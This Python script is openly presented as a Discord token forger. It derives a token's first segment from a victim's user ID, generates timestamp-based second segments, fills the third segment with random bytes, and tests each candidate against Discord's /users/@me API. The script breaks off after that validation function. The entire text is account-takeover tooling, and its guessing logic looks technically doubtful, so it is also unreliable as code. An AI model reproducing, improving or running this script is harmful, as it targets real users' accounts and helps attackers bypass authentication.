# discord_token_forge.py
# given a user id, derive the fixed first segment, generate timestamp-range second segments,
# and test candidates against discord api. calculates brute-force time estimate.

import base64
import time
import requests
import random
import os
from datetime import datetime, timezone

DISCORD_EPOCH = 1420070400000  # 2015-01-01 in ms
API_BASE = "https://discord.com/api/v10"

def snowflake_to_timestamp(user_id: int) -> int:
    """extract unix ms timestamp from snowflake"""
    return (user_id >> 22) + DISCORD_EPOCH

def b64_encode_int(n: int) -> str:
    """encode integer as base64 (no padding)"""
    b = n.to_bytes((n.bit_length() + 7) // 8 or 1, 'big')
    return base64.b64encode(b).decode().rstrip('=')

def user_id_to_first_segment(user_id: int) -> str:
    """first segment of a discord token is base64 of user id"""
    return base64.b64encode(str(user_id).encode()).decode().rstrip('=')

def generate_second_segments(creation_ts_ms: int, window_seconds: int = 300) -> list:
    """generate base64 timestamps around the account creation time"""
    creation_s = creation_ts_ms // 1000
    segments = []
    for offset in range(-window_seconds, window_seconds + 1):
        ts = creation_s + offset
        segments.append(base64.b64encode(str(ts).encode()).decode().rstrip('='))
    return segments

def random_third_segment() -> str:
    """random 27-char base64 hmac segment"""
    raw = os.urandom(20)
    return base64.b64encode(raw).decode().rstrip('=')[:27]

def test_token(token: str, session: requests.Session) -> bool:
    """hit /users/@me with the token. returns True if valid"""
    try:
        r = session.get(
            f"{API_BASE}/users/@me",
            headers={"Authorization": token},
            timeout=5
        )
        return r.status_code == 200
    except requests.RequestException:
        return False